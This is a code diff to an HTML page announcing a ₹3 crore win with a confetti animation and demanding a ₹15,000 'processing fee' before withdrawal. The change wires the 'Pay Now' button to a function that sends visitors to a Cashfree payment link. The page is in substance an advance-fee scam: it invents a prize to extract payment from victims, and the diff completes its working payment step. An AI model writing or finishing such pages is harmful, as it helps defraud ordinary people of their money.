@@ -103,7 +103,7 @@
       <div class="amount">₹3,00,00,000</div>
       <p>To complete your withdrawal, you need to pay a processing fee of ₹15,000.</p>
       <p class="red">Your withdrawal will be processed only after successful payment.</p>
-      <button>Pay Now ₹15,000</button>
+      <button onclick="redirectToPayment()">Pay Now ₹15,000</button>
       <p class="note">Payment will be processed securely via Cashfree Payments</p>
     </div>
   </div>
@@ -117,7 +117,7 @@
       useWorker: true
     });
 
-    const duration = 3 * 1000; // 3 seconds
+    const duration = 3 * 1000;
     const end = Date.now() + duration;
 
     (function frame() {
@@ -138,6 +138,10 @@
         requestAnimationFrame(frame);
       }
     })();
+
+    function redirectToPayment() {
+      window.location.href = "https://payments.cashfree.com/links?code=z8f6c0csag80";
+    }
   </script>
 </body>
 </html>
